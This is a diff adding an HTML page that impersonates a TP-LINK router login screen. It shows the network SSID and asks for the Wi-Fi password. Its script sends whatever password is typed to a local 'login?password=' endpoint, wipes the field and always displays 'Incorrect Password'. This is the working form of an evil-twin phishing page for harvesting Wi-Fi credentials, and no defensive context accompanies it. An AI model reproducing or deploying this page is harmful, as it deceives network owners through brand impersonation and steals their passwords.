@@ -1,0 +1,88 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<head>
+    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico"/>
+  
+    <link rel="stylesheet" href="main.css"/>
+    <title >TP-LINK</title>
+    <script>
+    var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("ssid").innerHTML = "SSID:"+
+      this.responseText;
+    }
+  };
+  xhttp.open("GET", "ssid", true);
+  xhttp.send();
+    </script>
+   
+</head>
+<body>
+
+<div id="pc-div">
+<div id="pc-top">
+    <div id="pc-top-container">
+        <a id="pc-top-product" href="" target="_blank">
+            <span class="icon-logo"></span>
+        </a>
+    </div>
+</div>
+<div id="pc-scroll">
+    
+        <div class="pc-login-content" id="pc-login">
+            <div id="error" class="errDivP md">
+                <span class="sprite b-error-alert"></span>
+                <p class="errTextP">Incorrect Password</p>
+            </div>
+            <span id="ssid">SSID:%s</span>
+            <div class="pc-login-field">
+                
+                <div class="pc-inputarea">
+                    <label class="pc-login-password-label">
+                        <span class="icon"></span>
+                    </label>
+                    <input type="password"  Placeholder="Password" id="pc-login-password" autocomplete="off">
+                    
+                </div>
+            </div>
+            <div>
+                <div class="button-wrapper">
+                    <button id="pc-login-btn" class="button-button" type="button">
+                        <span id="pc-login-btn" class="text button-text">Save</span>
+                    </button>
+                    
+                </div>
+            </div>
+        </div>
+        </div>
+        
+        
+    
+</div>
+</div>
+   <script text="text/javascript">
+   
+   document.getElementById("error").style="display:none"
+    document.getElementById("pc-login-btn").onclick = function() {myFunction()};
+
+    function myFunction() {
+        var pass=document.getElementById("pc-login-password").value;
+    document.getElementById("pc-login-password").value=""
+    document.getElementById("error").style="display:block"
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET",   "login?password="+pass, true ); // false for synchronous request
+    xmlHttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+    xmlHttp.send();
+    return;
+    }
+</script>
+       
+</body>
+
+
+</html>
